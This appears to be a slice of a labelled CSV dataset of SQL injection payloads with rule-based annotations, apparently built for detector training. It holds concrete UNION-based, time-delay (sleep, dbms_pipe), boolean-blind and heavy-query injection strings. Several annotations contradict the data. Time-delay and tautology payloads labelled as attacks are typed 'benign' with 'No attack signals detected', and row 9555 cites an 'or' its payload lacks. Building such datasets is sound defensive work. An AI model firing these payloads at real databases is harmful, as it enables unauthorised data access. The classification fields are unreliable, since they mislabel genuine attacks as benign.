row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
9540,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( '%' = '",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9541,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and '%' = ',1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
9542,"-3209'+ ( select ldum where 9912 = 9912 union all select 9912,9912,9912,9912#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9543,-8233' or 9538 = 1882#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9544,"-7125"" or ( 8919 = 2275 ) *2275 and ""fbwo"" = ""fbwo",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9545,"-4756"" ) ) union all select 6846,6846,6846,6846,6846,6846,6846#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9546,1' ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( 'uzmy' like 'uzmy,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
9547,"1"" ) ) as upvg where 4826 = 4826",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9548,1 ) ) as klmm where 3107 = 3107,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9549,1'|| ( select 'ptfi' from dual where 2234 = 2234 and 2006 = 2006,1,,boolean_blind,oracle,0.95,2234 = 2234 and detected — boolean_blind injection (priority 8) on oracle,rule-based
9550,"1 ) where 8474 = 8474 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
9551,"-4413%' ) ) union all select 1345,1345#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9552,"1%"" ) ) ) and 1594 = 8757",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9553,"1"" ) ) union all select null,null,null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9554,"1', ( case when 3598 = 2118 then 1 else null end )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9555,"-1004"" where 6266 = 6266 order by 1#",1,,boolean_blind,generic,0.95,6266 = 6266 or detected — boolean_blind injection (priority 8) on generic,rule-based
9556,"-7043"" ) where 9755 = 9755 union all select 9755,9755,9755,9755,9755,9755#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
